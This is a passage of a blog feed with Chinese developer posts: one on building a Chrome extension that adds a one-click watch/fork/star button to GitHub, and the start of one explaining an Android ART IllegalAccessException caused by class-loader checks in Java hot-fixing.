395.406538-289.147446 414.567947-492.458945 4.933359-52.344159-11.341303-96.465029-49.759288-134.88199-41.431621-41.423435-85.24243-62.424748-130.242319-62.424748-122.041544 0-220.005716 152.203494-220.989114 153.742547-3.045359 4.806469-8.53335 7.883551-14.101159 7.534603a16.257266 16.257266 0 0 1-13.736863-8.184403c-0.902556-1.587148-91.569532-158.081365-213.690893-158.081364z&quot; fill=&quot;#885F44&quot; p-id=&quot;1178&quot;&gt;&lt;/path&gt;&lt;/svg&gt; Combo&lt;/button&gt;&lt;/div&gt;&apos;</span><br><span class="line">//将combo按钮加入到最左边的按钮左边</span><br><span class="line">  btn.insertAdjacentHTML(&apos;afterbegin&apos;, newBtnHtml);</span><br><span class="line">  var btnTag = btn.getElementsByTagName(&quot;button&quot;)[0];</span><br><span class="line"></span><br><span class="line">  btnTag.style.borderBottomRightRadius = &quot;3px&quot;;</span><br><span class="line">  btnTag.style.borderTopRightRadius = &quot;3px&quot;;</span><br><span class="line">  var targetBtn = document.getElementById(comboBtnRightId);</span><br><span class="line">  btnLayout.insertBefore(btn, targetBtn);</span><br><span class="line"></span><br><span class="line">//这里设置combo按钮的点击事件</span><br><span class="line">  var comboBtn = document.getElementById(&apos;combo_btn&apos;);</span><br><span class="line">  comboBtn.onclick = function() &#123;</span><br><span class="line">    //里面执行的流程涉及到与background的通信，我们放在最后讲</span><br><span class="line">    chrome.runtime.sendMessage(&apos;&apos;, function(response) &#123;</span><br><span class="line">      var responseObj = JSON.parse(response)</span><br><span class="line">      var watchType = responseObj.watchType</span><br><span class="line">      var starCombo = responseObj.starCombo</span><br><span class="line">      var watchCombo = responseObj.watchCombo</span><br><span class="line">      var forkCombo = responseObj.forkCombo</span><br><span class="line">      if (forkCombo == 1) &#123;</span><br><span class="line">        clickForkBtn()</span><br><span class="line">      &#125;</span><br><span class="line">      if (starCombo == 1) &#123;</span><br><span class="line">        clickStarBtn()</span><br><span class="line">      &#125;</span><br><span class="line">      if (watchCombo == 1) &#123;</span><br><span class="line">        clickWatchBtn(watchType)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">initComboBtn()</span><br></pre></td></tr></table></figure></p><h3 id="0x04-background介绍"><a href="#0x04-background介绍" class="headerlink" title="0x04 background介绍"></a>0x04 background介绍</h3><p>他比较像是一个一直在后台执行的东西，当然了它的周期也是可以控制的，但是我这里选择了常驻，因为需要用它读取配置文件，以及在不相关的页面将浏览器扩展列表中github三连扩展置灰的功能。<br>嗨呀这里也直接看代码吧，因为代码比较少。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">//这里实现了两个函数用来操作配置文件（读/写）</span><br><span class="line">function setLocalStorage(pWatchType, pStarCombo, pWatchCombo, pForkCombo) &#123;</span><br><span class="line">  localStorage[&apos;watchType&apos;] = pWatchType</span><br><span class="line">  localStorage[&apos;starCombo&apos;] = pStarCombo</span><br><span class="line">  localStorage[&apos;watchCombo&apos;] = pWatchCombo</span><br><span class="line">  localStorage[&apos;forkCombo&apos;] = pForkCombo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getLocalStorage() &#123;</span><br><span class="line">  var result = new Object()</span><br><span class="line">  result.watchType = localStorage[&apos;watchType&apos;]</span><br><span class="line">  result.starCombo = localStorage[&apos;starCombo&apos;]</span><br><span class="line">  result.watchCombo = localStorage[&apos;watchCombo&apos;]</span><br><span class="line">  result.forkCombo = localStorage[&apos;forkCombo&apos;]</span><br><span class="line">  return JSON.stringify(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这里用来实现那个在github页面时，浏览器上的对应插件按钮彩色，而在其他页面该按变成灰色的功能</span><br><span class="line">chrome.runtime.onInstalled.addListener(function() &#123;</span><br><span class="line">  chrome.declarativeContent.onPageChanged.removeRules(undefined, function() &#123;</span><br><span class="line">    chrome.declarativeContent.onPageChanged.addRules([&#123;</span><br><span class="line">      conditions: [</span><br><span class="line">        new chrome.declarativeContent.PageStateMatcher(&#123;</span><br><span class="line">          pageUrl: &#123;</span><br><span class="line">            urlContains: &apos;github.com&apos;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      ],</span><br><span class="line">      actions: [new chrome.declarativeContent.ShowPageAction()]</span><br><span class="line">    &#125;]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//这里涉及到通信，下面再讲</span><br><span class="line">chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) &#123;</span><br><span class="line">  var response = new Object()</span><br><span class="line">  response.watchType = localStorage[&apos;watchType&apos;]</span><br><span class="line">  response.starCombo = localStorage[&apos;starCombo&apos;]</span><br><span class="line">  response.watchCombo = localStorage[&apos;watchCombo&apos;]</span><br><span class="line">  response.forkCombo = localStorage[&apos;forkCombo&apos;]</span><br><span class="line">  sendResponse(JSON.stringify(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//这里仅仅是在第一次使用插件时进行默认配置用的</span><br><span class="line">var isFirstLoad = localStorage[&apos;comBoinit&apos;]</span><br><span class="line">if (isFirstLoad != 1) &#123;</span><br><span class="line">  localStorage[&apos;comBoinit&apos;] = 1</span><br><span class="line">  localStorage[&apos;watchType&apos;] = &apos;subscribed&apos;</span><br><span class="line">  localStorage[&apos;starCombo&apos;] = 1</span><br><span class="line">  localStorage[&apos;watchCombo&apos;] = 1</span><br><span class="line">  localStorage[&apos;forkCombo&apos;] = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="0x05-page-action介绍"><a href="#0x05-page-action介绍" class="headerlink" title="0x05 page_action介绍"></a>0x05 page_action介绍</h3><p>有了上面的代码，其实就已经可以实现三连的功能的，但是这样还是太粗暴了，考虑到使用者（嗨呀假设我写的这个东西真的有人用嗷）可能会有配置的需求，比如说设置配置连击功能或者是watch类型的情况，这里还需要有个配置页面。<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/%E6%88%AA%E5%B1%8F2019-11-20%E4%B8%8B%E5%8D%8810.27.54.png?raw=true" alt=""><br>接下来又到了喜闻乐见的看代码环节，总的来说逻辑比较简单，就是根据页面点击来读取和设置配置文件这样，需要注意的是，配置文件的操作我都是在background里面做的，前端代码在这里 <a href="https://github.com/EggUncle/GithubComboButton/blob/master/html/popup.html" target="_blank" rel="noopener">https://github.com/EggUncle/GithubComboButton/blob/master/html/popup.html</a> 我不太擅长html这个。。所以页面略丑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">var watchTypeForm = document.getElementById(&quot;watch_type_id&quot;);</span><br><span class="line">var backgroundPage = chrome.extension.getBackgroundPage();</span><br><span class="line">var config = JSON.parse(backgroundPage.getLocalStorage())</span><br><span class="line">var watchType = config.watchType</span><br><span class="line">var starCombo = config.starCombo</span><br><span class="line">var watchCombo = config.watchCombo</span><br><span class="line">var forkCombo = config.forkCombo</span><br><span class="line"></span><br><span class="line">var watchTypeRadios = watchTypeForm.getElementsByTagName(&apos;input&apos;)</span><br><span class="line">for (var i = 0; i &lt; watchTypeRadios.length; i++) &#123;</span><br><span class="line">  var watchTypeRadio = watchTypeRadios[i]</span><br><span class="line">  var watchValue = watchTypeRadio.getAttribute(&apos;value&apos;)</span><br><span class="line">  if (watchValue == watchType) &#123;</span><br><span class="line">    watchTypeRadio.checked = true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">watchTypeForm.addEventListener(&apos;click&apos;, function() &#123;</span><br><span class="line">  var e = event || window.event;</span><br><span class="line">  if (e.target &amp;&amp; e.target.nodeName.toUpperCase() == &quot;INPUT&quot;) &#123;</span><br><span class="line">    //localStorage[&apos;watch_type&apos;] = e.target.value</span><br><span class="line">    watchType = e.target.value</span><br><span class="line">    backgroundPage.setLocalStorage(watchType, starCombo, watchCombo, watchCombo)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, false);</span><br><span class="line"></span><br><span class="line">var combosActionForm = document.getElementById(&apos;combo_action_id&apos;);</span><br><span class="line">var combosActionCheckboxs = combosActionForm.getElementsByTagName(&apos;input&apos;)</span><br><span class="line">for (var i = 0; i &lt; combosActionCheckboxs.length; i++) &#123;</span><br><span class="line">  var combosActionCheckbox = combosActionCheckboxs[i]</span><br><span class="line">  var combosActionBoxValue = combosActionCheckbox.getAttribute(&apos;value&apos;)</span><br><span class="line">  if (combosActionBoxValue == &apos;watch&apos; &amp;&amp; watchCombo == 1) &#123;</span><br><span class="line">    combosActionCheckbox.checked = true</span><br><span class="line">  &#125; else if (combosActionBoxValue == &apos;star&apos; &amp;&amp; starCombo == 1) &#123;</span><br><span class="line">    combosActionCheckbox.checked = true</span><br><span class="line">  &#125; else if (combosActionBoxValue == &apos;fork&apos; &amp;&amp; forkCombo == 1) &#123;</span><br><span class="line">    combosActionCheckbox.checked = true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">combosActionForm.addEventListener(&apos;click&apos;, function() &#123;</span><br><span class="line">  var e = event || window.event;</span><br><span class="line">  if (e.target &amp;&amp; e.target.nodeName.toUpperCase() == &quot;INPUT&quot;) &#123;</span><br><span class="line">    var checkboxValue = e.target.value</span><br><span class="line">    if (checkboxValue == &apos;watch&apos; &amp;&amp; e.target.checked) &#123;</span><br><span class="line">      watchCombo = 1</span><br><span class="line">    &#125; else if (checkboxValue == &apos;watch&apos; &amp;&amp; !e.target.checked) &#123;</span><br><span class="line">      watchCombo = 0</span><br><span class="line">    &#125; else if (checkboxValue == &apos;star&apos; &amp;&amp; e.target.checked) &#123;</span><br><span class="line">      starCombo = 1</span><br><span class="line">    &#125; else if (checkboxValue == &apos;star&apos; &amp;&amp; !e.target.checked) &#123;</span><br><span class="line">      starCombo = 0</span><br><span class="line">    &#125; else if (checkboxValue == &apos;fork&apos; &amp;&amp; e.target.checked) &#123;</span><br><span class="line">      forkCombo = 1</span><br><span class="line">    &#125; else if (checkboxValue == &apos;fork&apos; &amp;&amp; !e.target.checked) &#123;</span><br><span class="line">      forkCombo = 0</span><br><span class="line">    &#125;</span><br><span class="line">    backgroundPage.setLocalStorage(watchType, starCombo, watchCombo, forkCombo)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure></p><h3 id="0x06-各个模块之间的通信"><a href="#0x06-各个模块之间的通信" class="headerlink" title="0x06 各个模块之间的通信"></a>0x06 各个模块之间的通信</h3><p>首先简单总结一些，在三连功能中，上面三个模块的作用</p><ul><li>content script: 实现js注入，创建combo按钮，设置点击事件，与background通信，读取配置</li><li>background: 提供配置文件的保存与读取功能</li><li>page_action: 提供配置按钮，写入配置<br>各个模块之间其实都是可以互相通信的，这里我用到的，仅仅是content script 与 background 之间的通信，以及 background 与 page_action通信</li></ul><ol><li>background 与 content script之间的通信<br>content script中通过chrome.runtime.sendMessage来与background进行通信，这里设置了请求成功后的回调，对background中的返回的信息进行解析</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">chrome.runtime.sendMessage(&apos;&apos;, function(response) &#123;</span><br><span class="line">  var responseObj = JSON.parse(response)</span><br><span class="line">  var watchType = responseObj.watchType</span><br><span class="line">  var starCombo = responseObj.starCombo</span><br><span class="line">  var watchCombo = responseObj.watchCombo</span><br><span class="line">  var forkCombo = responseObj.forkCombo</span><br><span class="line">  if (forkCombo == 1) &#123;</span><br><span class="line">    clickForkBtn()</span><br><span class="line">  &#125;</span><br><span class="line">  if (starCombo == 1) &#123;</span><br><span class="line">    clickStarBtn()</span><br><span class="line">  &#125;</span><br><span class="line">  if (watchCombo == 1) &#123;</span><br><span class="line">    clickWatchBtn(watchType)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>background通过 listener来监听其他组件发来的请求，并使用sendResponse进行响应<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) &#123;</span><br><span class="line">  var response = new Object()</span><br><span class="line">  response.watchType = localStorage[&apos;watchType&apos;]</span><br><span class="line">  response.starCombo = localStorage[&apos;starCombo&apos;]</span><br><span class="line">  response.watchCombo = localStorage[&apos;watchCombo&apos;]</span><br><span class="line">  response.forkCombo = localStorage[&apos;forkCombo&apos;]</span><br><span class="line">  sendResponse(JSON.stringify(response));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><ol start="2"><li>page_action 与 background 进行通信<br>这个就非常简单粗暴了，通过chrome插件的api获取background对象，再直接调用background提供的函数就行了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var backgroundPage = chrome.extension.getBackgroundPage();</span><br><span class="line">var config = JSON.parse(backgroundPage.getLocalStorage())</span><br></pre></td></tr></table></figure></li></ol><h3 id="0x07-保存配置文件"><a href="#0x07-保存配置文件" class="headerlink" title="0x07 保存配置文件"></a>0x07 保存配置文件</h3><p>因为涉及到配置，所以肯定就需要有保存配置的功能了，这里首先需要申请‘storage’权限，这里见上文中关于配置文件的说明，其实各个页面都可以使用配置文件存储的功能，但是这里想统一管理起来，所以选择了使用background做了配置文件相关的功能，使用的话非常简单，就是键值对的读写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function setLocalStorage(pWatchType, pStarCombo, pWatchCombo, pForkCombo) &#123;</span><br><span class="line">  localStorage[&apos;watchType&apos;] = pWatchType</span><br><span class="line">  localStorage[&apos;starCombo&apos;] = pStarCombo</span><br><span class="line">  localStorage[&apos;watchCombo&apos;] = pWatchCombo</span><br><span class="line">  localStorage[&apos;forkCombo&apos;] = pForkCombo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getLocalStorage() &#123;</span><br><span class="line">  var result = new Object()</span><br><span class="line">  result.watchType = localStorage[&apos;watchType&apos;]</span><br><span class="line">  result.starCombo = localStorage[&apos;starCombo&apos;]</span><br><span class="line">  result.watchCombo = localStorage[&apos;watchCombo&apos;]</span><br><span class="line">  result.forkCombo = localStorage[&apos;forkCombo&apos;]</span><br><span class="line">  return JSON.stringify(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在写入之后，在chrome的开发者页面也是能看到保存的信息的<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/%E6%88%AA%E5%B1%8F2019-11-21%E4%B8%8B%E5%8D%8811.19.46.png?raw=true" alt=""></p><h3 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h3><p>总的来说，chrome的功能我感觉还是挺强大的，本身用的好的话也能实现很多很有趣的功能，学会写这个，感觉也能给一些工作或者生活带来少许的便利吧。比较遗憾的是，现在新开发的chrome扩展再上架到扩展商店的话，也只能给chrome os来用了，所以这里就没做上架啥的了。</p><h3 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h3><p>这篇文章的作者写的很详细了，有兴趣的朋友也可以看看<br><a href="https://www.cnblogs.com/liuxianan/p/chrome-plugin-develop.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuxianan/p/chrome-plugin-develop.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;前一阵因为工作的原因需要反复在一个网站上看点儿东西，但是有个东西老得手动算一下，这里觉得比较费劲，就顺手学了一把chrome插件，感觉挺好使的，同事用了，都说好（手动滑稽），后来觉得这个东西还挺好玩的，就顺手想写个东西放git上玩一玩，于是就有了这个文章。总的来说，写了一个用于github一键三连的按钮（watch/fork/star）按钮 &lt;a href=&quot;https://github.com/EggUncle/GithubComboButton&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/EggUncle/GithubComboButton&lt;/a&gt; ，代码量非常少，但是我觉着也涉及到了chrome插件开发相关的方方面面吧，所以这里记一下整个开发过程和涉及到的知识，主要还是太菜了嗨呀，前段和js不太会，踩了很多坑。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>通过替换类加载器来绕过访问权限的一些问题</title>
    <link href="http://yoursite.com/2019/07/11/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9D%A5%E7%BB%95%E8%BF%87%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2019/07/11/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9D%A5%E7%BB%95%E8%BF%87%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</id>
    <published>2019-07-10T17:03:23.000Z</published>
    <updated>2020-07-28T14:11:38.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>组里有java热修复项目，其中有一部分功能是根据diff自动生成补丁，在最近维护的时候，遇到了一个问题，在补丁运行时会出现IllegalAccessException，说到这里可能很多人就已经知道答案了，由于IsInSamePackage导致，因此反射替换类加载器为原先的类即可。 这样确实没什么问题，但是我们的场景在系统中，于是这里遇上了一些新的问题。情况是，在替换类加载器后，仍然在IsInSamePackage中没有通过类加载器是否相同的校验，导致返回false，抛出非法访问的异常。</p><a id="more"></a><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>这里还是需要先简单介绍一下，IllegalAccessException这个异常出现的原因，首先可以在虚拟机里搜索这个字段，我们这里只探讨，补丁类对象在访问被修补的类的同包类是，导致的非法访问异常。可以搜索到涉及的报错函数如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void ThrowIllegalAccessErrorClass(ObjPtr&lt;mirror::Class&gt; referrer, ObjPtr&lt;mirror::Class&gt; accessed) &#123;</span><br><span class="line">  std::ostringstream msg;</span><br><span class="line">  msg &lt;&lt; &quot;Illegal class access: &apos;&quot; &lt;&lt; mirror::Class::PrettyDescriptor(referrer)</span><br><span class="line">      &lt;&lt; &quot;&apos; attempting to access &apos;&quot; &lt;&lt; mirror::Class::PrettyDescriptor(accessed) &lt;&lt; &quot;&apos;&quot;;</span><br><span class="line">  ThrowException(&quot;Ljava/lang/IllegalAccessError;&quot;, referrer, msg.str().c_str());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过在源码中检索这个函数，发现它都是在一个叫CanAccess的函数判断结束之后调用的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline bool Class::CanAccess(ObjPtr&lt;Class&gt; that) &#123;</span><br><span class="line">  return that-&gt;IsPublic() || this-&gt;IsInSamePackage(that);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的实现也非常简单，可以看到做了两个判断，目标类是否是public的，或是否是同包下的。而接下来，就是很多人都分析过的，IsInSamePackage这个函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">bool Class::IsInSamePackage(std::string_view descriptor1, std::string_view descriptor2) &#123;</span><br><span class="line">  size_t i = 0;</span><br><span class="line">  size_t min_length = std::min(descriptor1.size(), descriptor2.size());</span><br><span class="line">  while (i &lt; min_length &amp;&amp; descriptor1[i] == descriptor2[i]) &#123;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  if (descriptor1.find(&apos;/&apos;, i) != std::string_view::npos ||</span><br><span class="line">      descriptor2.find(&apos;/&apos;, i) != std::string_view::npos) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool Class::IsInSamePackage(ObjPtr&lt;Class&gt; that) &#123;</span><br><span class="line">  ObjPtr&lt;Class&gt; klass1 = this;</span><br><span class="line">  ObjPtr&lt;Class&gt; klass2 = that;</span><br><span class="line">  if (klass1 == klass2) &#123;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">  // Class loaders must match.</span><br><span class="line">  if (klass1-&gt;GetClassLoader() != klass2-&gt;GetClassLoader()) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  // Arrays are in the same package when their element classes are.</span><br><span class="line">  while (klass1-&gt;IsArrayClass()) &#123;</span><br><span class="line">    klass1 = klass1-&gt;GetComponentType();</span><br><span class="line">  &#125;</span><br><span class="line">  while (klass2-&gt;IsArrayClass()) &#123;</span><br><span class="line">    klass2 = klass2-&gt;GetComponentType();</span><br><span class="line">  &#125;</span><br><span class="line">  // trivial check again for array types</span><br><span class="line">  if (klass1 == klass2) &#123;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">  // Compare the package part of the descriptor string.</span><br><span class="line">  std::string temp1, temp2;</span><br><span class="line">  return IsInSamePackage(klass1-&gt;GetDescriptor(&amp;temp1), klass2-&gt;GetDescriptor(&amp;temp2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实现也不复杂，首先就是对类的类加载器是否相同进行检查，而后调用两个参数的重载函数对类的报名进行对比。这里为了让他们通过类加载器对比的校验，常用的解决方案都是直接将目标类加载器补丁的类加载器，来达到通过检查的目的。而在对系统进行java热修复时，这里会有例外的情况，在android中，有很多类是直接使用bootclassloader进行创建的，而在修补这些类的时候，是不能通过替换类加载器来达到目的。我之前也纳闷很急这里为什么不行。后来看了下GetClassLoader，发现它的实现并不是直接返回classloader那么简单粗暴的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">static ObjPtr&lt;mirror::ClassLoader&gt; GetClassLoader(const ScopedObjectAccess&amp; soa)</span><br><span class="line">    REQUIRES_SHARED(Locks::mutator_lock_) &#123;</span><br><span class="line">  ArtMethod* method = soa.Self()-&gt;GetCurrentMethod(nullptr);</span><br><span class="line">  // If we are running Runtime.nativeLoad, use the overriding ClassLoader it set.</span><br><span class="line">  if (method ==</span><br><span class="line">      jni::DecodeArtMethod&lt;kEnableIndexIds&gt;(WellKnownClasses::java_lang_Runtime_nativeLoad)) &#123;</span><br><span class="line">    return soa.Decode&lt;mirror::ClassLoader&gt;(soa.Self()-&gt;GetClassLoaderOverride());</span><br><span class="line">  &#125;</span><br><span class="line">  // If we have a method, use its ClassLoader for context.</span><br><span class="line">  if (method != nullptr) &#123;</span><br><span class="line">    return method-&gt;GetDeclaringClass()-&gt;GetClassLoader();</span><br><span class="line">  &#125;</span><br><span class="line">  // We don&apos;t have a method, so try to use the system ClassLoader.</span><br><span class="line">  ObjPtr&lt;mirror::ClassLoader&gt; class_loader =</span><br><span class="line">      soa.Decode&lt;mirror::ClassLoader&gt;(Runtime::Current()-&gt;GetSystemClassLoader());</span><br><span class="line">  if (class_loader != nullptr) &#123;</span><br><span class="line">    return class_loader;</span><br><span class="line">  &#125;</span><br><span class="line">  // See if the override ClassLoader is set for gtests.</span><br><span class="line">  class_loader = soa.Decode&lt;mirror::ClassLoader&gt;(soa.Self()-&gt;GetClassLoaderOverride());</span><br><span class="line">  if (class_loader != nullptr) &#123;</span><br><span class="line">    // If so, CommonCompilerTest should have marked the runtime as a compiler not compiling an</span><br><span class="line">    // image.</span><br><span class="line">    CHECK(Runtime::Current()-&gt;IsAotCompiler());</span><br><span class="line">    CHECK(!Runtime::Current()-&gt;IsCompilingBootImage());</span><br><span class="line">    return class_loader;</span><br><span class="line">  &#125;</span><br><span class="line">  // Use the BOOTCLASSPATH.</span><br><span class="line">  return nullptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，如果需要BOOTCLASS的时候，它是直接返回null的，所以如果使用原类的类加载器替换补丁的加载器，可能会出现，使用bootclassloader来替换补丁类加载器的情况，而使用bootclassloader加载的类，在GetClassLoader的时候，返回的其实是空，这样就导致IsInSamePackage中校验类加载器是否不同的地方走入if流程，返回false，导致非法访问异常。</p><h1 id="0x02-解决方案"><a 